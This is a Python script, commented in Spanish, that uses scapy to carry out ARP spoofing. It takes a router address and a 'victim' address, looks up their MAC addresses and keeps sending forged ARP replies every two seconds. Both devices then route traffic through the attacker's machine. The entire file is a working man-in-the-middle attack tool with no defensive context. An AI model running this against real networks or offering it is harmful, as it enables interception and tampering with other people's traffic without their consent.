import scapy.all as scapy
import sys
import time


#Ingresamos la ip del router y la ip de la victima
router_ip = str(sys.argv[1])
target_ip = str(sys.argv[2])


#funcion para sacar la macaddress del router y la victima
def get_mac_address(ip_address):
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2 , verbose=True)[0]
    return answer[0][1].hwsrc


target_mac= str(get_mac_address(target_ip))
router_mac= str(get_mac_address(router_ip))


# op=2 'Response' 
def spoof(router_ip,target_ip,route_mac,target_mac):
# El primer paquete que enviamos hace que el router crea que la victima le esta enviando un paquete
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip,psrc=target_ip)
# El segundo paquete que enviamos le hace creer a la victima que el router le esta enviando un paquete
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip,psrc=router_ip)

    scapy.send(packet1)
    scapy.send(packet2)

#Este loop lo unico que hace es enviar los paquetes cada 2 segundos para que cuando la tabla arp se refresque siga spoofeada

try:
    while True:
        spoof(router_ip,target_ip,router_mac,target_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print('Closing ARP Spooder.')

